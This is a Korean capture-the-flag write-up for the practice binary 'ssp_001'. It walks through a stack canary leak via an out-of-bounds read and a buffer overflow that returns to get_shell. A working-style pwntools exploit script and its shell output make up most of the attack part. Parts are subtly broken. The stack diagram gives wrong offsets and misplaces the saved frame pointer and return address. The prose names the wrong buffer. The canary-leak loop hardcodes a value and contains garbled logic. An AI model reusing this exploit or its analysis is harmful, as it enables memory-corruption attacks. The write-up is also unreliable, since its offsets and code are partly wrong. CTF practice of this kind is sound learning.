### Description
```
이 문제는 작동하고 있는 서비스(ssp_001)의 바이너리와 소스코드가 주어집니다.
프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
“flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{…} 입니다.
```

### Environment
```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

---

### Challenge Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}

```

- Shell을 띄워주는 <code>get_shell</code> 함수 존재
- Menu를 출력하는 <code>menu</code> 함수 존재
- Menu E에서 원하는 크기만큼 box에 입력을 줄 수 있기 때문에 Buffer Overflow 발생

---

### GDB 
#### Main Disassemble
```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x08048795 <+106>:	push   0x2
   0x08048797 <+108>:	lea    eax,[ebp-0x8a]
   0x0804879d <+114>:	push   eax
   0x0804879e <+115>:	push   0x0
   0x080487a0 <+117>:	call   0x80484a0 <read@plt>
   0x080487a5 <+122>:	add    esp,0xc
   <--  Continue  -->
   0x080487d3 <+168>:	push   0x40
   0x080487d5 <+170>:	lea    eax,[ebp-0x88]
   0x080487db <+176>:	push   eax
   0x080487dc <+177>:	push   0x0
   0x080487de <+179>:	call   0x80484a0 <read@plt>
   0x080487e3 <+184>:	add    esp,0xc
   <--  Continue  -->
   0x080487f8 <+205>:	lea    eax,[ebp-0x94]
   0x080487fe <+211>:	push   eax
   0x080487ff <+212>:	push   0x804898a
   0x08048804 <+217>:	call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:	add    esp,0x8
   <--  Continue  -->
   0x08048852 <+295>:	mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:	push   eax
   0x08048859 <+302>:	lea    eax,[ebp-0x48]
   0x0804885c <+305>:	push   eax
   0x0804885d <+306>:	push   0x0
   0x0804885f <+308>:	call   0x80484a0 <read@plt>
   0x08048864 <+313>:	add    esp,0xc
   <--  Continue  -->
End of assembler dump.
```

- <code>select</code> = <code>[ebp-0x8a]</code>
- <code>box</code> = <code>[ebp-0x88]</code>
- <code>idx</code> = <code>[ebp-0x94]</code>
- <code>name</code> = <code>[ebp-0x48]</code>
- <code>name_len</code> = <code>[ebp-0x90]</code>

---

### Stack 구조 파악
```bash
+----------------------+
+          idx         + <- ebp-0x94
+----------------------+
+        name_len      + <- ebp-0x90
+----------------------+
+         select       + <- ebp-0x9a
+----------------------+
+          box         + <- ebp-0x88
+----------------------+
+         name         + <- ebp-0x48
+----------------------+
+        canary        + <- ebp-0x08
+----------------------+
+         Dummy        + <- ebp-0x04
+----------------------+ <- ebp
+          SFD         + <- ebp-0x04
+----------------------+
+          RET         + <- ebp-0x08
+----------------------+
```
Canary는 Buffer가 모두 할당된 후 Buffer와 sfp 사이에 존재하므로 name 직후에 존재하는 걸 알 수 있음

---
### Exploit Code 
```python
from pwn import *

context.log_level = 'debug'

p = process('./ssp_001')
elf = ELF('./ssp_001')

p.sendlineafter('> ', 'F')
p.sendlineafter('box input : ', 'A'*0x40)

get_shell = elf.symbols['get_shell']
print('[+] get_shell : ' + hex(get_shell))

canary = b'0x7a6eb600'
for idx in range(4):
    p.sendafter('> ', 'P')
    p.sendlineafter('Element index : ', str(0x80 + idx))
    p.recvuntil('is : ')
    canary = p.recvuntil('\n'[:2] + canary)

canary = int(canary, 16)
print('[+] canary : ' + hex(canary))

p.sendafter('> ', 'E')
payload = b'A' * 0x40
payload += p32(canary)
payload += b'B' * 0x8
payload += p32(get_shell)

payload_len = len(payload.decode('utf-8', 'backslashreplace'))

p.sendlineafter('Name Size : ', str(payload_len))
p.sendlineafter('Name : ', payload)

p.interactive()
```

----
```bash
[*] Switching to interactive mode
$ id
uid=1000(ssp_001) gid=1000(ssp_001) groups=1000(ssp_001)

$ cat flag
DH{안알랴쥼}
```